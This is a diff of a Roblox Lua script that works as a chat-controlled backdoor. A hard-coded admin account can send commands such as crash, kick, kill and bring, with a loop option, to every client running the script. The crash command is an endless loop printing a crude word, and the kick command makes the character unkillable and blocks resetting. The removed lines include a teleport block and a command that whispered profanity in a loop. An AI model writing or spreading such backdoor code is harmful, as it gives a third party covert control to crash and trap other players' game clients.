@@ -1,38 +1,19 @@
--- AA
+local TextChatService = game:GetService("TextChatService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local TextChatService = game:GetService("TextChatService")
-
--- 어드민 목록
 local AdminList = { "Diwno2ff" }
 
--- 유틸: 어드민 체크
-local function isAdminListed(name)
-    for _, adminName in ipairs(AdminList) do
-        if name:lower() == adminName:lower() then
-            return true
-        end
-    end
-    return false
-end
+local Loops = {}
 
--- 유틸: 채팅 전송 (새 채팅 시스템 기준)
-local function sendChat(msg)
-    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-    if channel then
-        channel:SendAsync(msg)
-    end
-end
+local cmds = {}
 
--- crash
-local function crash()
+cmds["crash"] = function()
     while true do
         print("Penis")
     end
 end
 
--- kick (재설정 금지 + 나가기 금지)
-local function kick()
+cmds["kick"] = function(_, _)
     if LocalPlayer.Character then
         local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
         local Hocf = hrp and hrp.CFrame
@@ -53,7 +34,6 @@ local function kick()
             newHum.Health = math.huge
         end)
 
-        -- Reset 비활성화
         task.spawn(function()
             repeat
                 task.wait()
@@ -62,28 +42,20 @@ local function kick()
                 end)
             until false
         end)
+    end
+end
 
-        -- 나가기 방지
-        LocalPlayer.OnTeleport = function(State)
-            if State == Enum.TeleportState.Started then
-                error("Leaving blocked!")
-            end
+cmds["bring"] = function(Admin)
+    if LocalPlayer.Character and Admin.Character then
+        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
+        if hrp and adminHrp then
+            hrp.CFrame = adminHrp.CFrame
         end
     end
 end
 
--- bring (Admin이 LocalPlayer 위치로 이동)
-local function bring(Admin)
-    if not (Admin and Admin.Character and LocalPlayer.Character) then return end
-    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
-    if hrp and adminHrp then
-        adminHrp.CFrame = hrp.CFrame
-    end
-end
-
--- kill
-local function kill()
+cmds["kill"] = function()
     if LocalPlayer.Character then
         local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
         if hum then
@@ -92,46 +64,90 @@ local function kill()
     end
 end
 
--- chatban (비공으로 fuck 반복)
-local function chatban(Admin)
-    if not Admin then return end
+local function isAdminListed(playerName)
+    for _, name in ipairs(AdminList) do
+        if name:lower() == playerName:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+local function FindMatch(Name)
+    Name = Name:lower()
+    for _, Player in Players:GetPlayers() do
+        if Player.Name:lower():sub(1, #Name) == Name then
+            return Player
+        end
+    end
+    return nil
+end
+
+local function StartLoop(command, sender, data)
+    if Loops[command] then return end
+    Loops[command] = true
     task.spawn(function()
-        while true do
-            task.wait(0.5)
-            sendChat(string.format("/w %s fuck", Admin.Name))
+        while Loops[command] do
+            pcall(function()
+                cmds[command](sender, data)
+            end)
+            task.wait(1)
         end
     end)
 end
 
--- help (비공으로 한 번만)
-local function help(Admin)
-    if not Admin then return end
-    sendChat(string.format("/w %s 나는 NP를 사용해요.", Admin.Name))
+local function StopLoop(command)
+    Loops[command] = nil
 end
 
--- 채팅 감지 (새 채팅 시스템)
 TextChatService.OnIncomingMessage = function(message)
     local sender = message.TextSource
     if not sender then return end
-    if not isAdminListed(sender.Name) then return end -- 어드민만 실행 가능
 
-    local text = message.Text:lower()
-    if text:sub(1,1) == ":" then
-        local args = string.split(text:sub(2), " ")
-        local command = args[1]
+    local senderName = sender.Name
+    if not isAdminListed(senderName) then return end
 
-        if command == "crash" then
-            crash()
-        elseif command == "kick" then
-            kick()
-        elseif command == "bring" then
-            bring(Players:FindFirstChild(sender.Name))
-        elseif command == "kill" then
-            kill()
-        elseif command == "chatban" then
-            chatban(Players:FindFirstChild(sender.Name))
-        elseif command == "help" then
-            help(Players:FindFirstChild(sender.Name))
+    local lowerMsg = message.Text:lower()
+    if string.sub(lowerMsg, 1, 1) == ":" then
+        local args = string.split(string.sub(lowerMsg, 2), " ")
+        if #args == 0 then return end
+
+        local Command = table.remove(args, 1)
+        local TargetName = args[1] or ""
+        local Data = table.concat(args, " ", 2)
+
+        local isLoop = false
+        if Command:sub(1,4) == "loop" then
+            isLoop = true
+            Command = Command:sub(5)
+        elseif TargetName:lower() == "-loop" then
+            isLoop = true
+            TargetName = table.remove(args,1) or ""
+            Data = table.concat(args, " ", 2)
+        elseif Command:sub(1,6) == "unloop" then
+            local unloopCmd = Command:sub(7)
+            StopLoop(unloopCmd)
+            return
+        end
+
+        Command = Command:lower()
+        if cmds[Command] then
+            local Target
+            if TargetName == "@s" or TargetName:lower() == LocalPlayer.Name:lower() then
+                Target = LocalPlayer
+            else
+                Target = FindMatch(TargetName)
+            end
+
+            if TargetName == "all" or Target == LocalPlayer then
+                if isLoop then
+                    StartLoop(Command, sender, Data)
+                else
+                    pcall(function()
+                        cmds[Command](sender, Data)
+                    end)
+                end
+            end
         end
     end
 end
